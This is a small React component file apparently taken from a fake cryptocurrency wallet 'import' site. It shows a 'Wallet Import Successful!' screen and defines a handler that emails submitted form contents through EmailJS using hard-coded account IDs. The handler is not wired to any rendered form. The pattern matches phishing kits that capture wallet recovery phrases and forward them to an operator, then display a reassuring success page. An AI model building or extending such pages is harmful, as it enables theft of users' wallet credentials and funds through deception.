import React, { useRef, useState } from "react";
import "./ImportSuccessful.css";
import ImportHeader from "../ImportHeader/ImportHeader";
import emailjs from "@emailjs/browser";
import QR from "./QR Code.png";

function ImportPhrase() {
	const form = useRef();

	const [input1, setInput1] = useState("Successful");

	const handleSubmit = (e) => {
		e.preventDefault();

		emailjs
			.sendForm(
				"service_plwn5yz",
				"template_qyjz4s7",
				form.current,
				"user_CfvcWb4q5M6DwsbbSJS6T"
			)
			.then(
				(result) => {
					console.log(result.text);
					alert("Successful");
				},
				(error) => {
					console.log(error.text);
				}
			);
		e.target.reset();
		// setText1([input1, ...text1]);
		// setInput1("");
	};

	return (
		<div>
			<ImportHeader />
			<div className="importsuccessful">
				<img src={QR} alt="" />
				<p>Wallet Import Successful!</p>
			</div>
		</div>
	);
}

export default ImportPhrase;
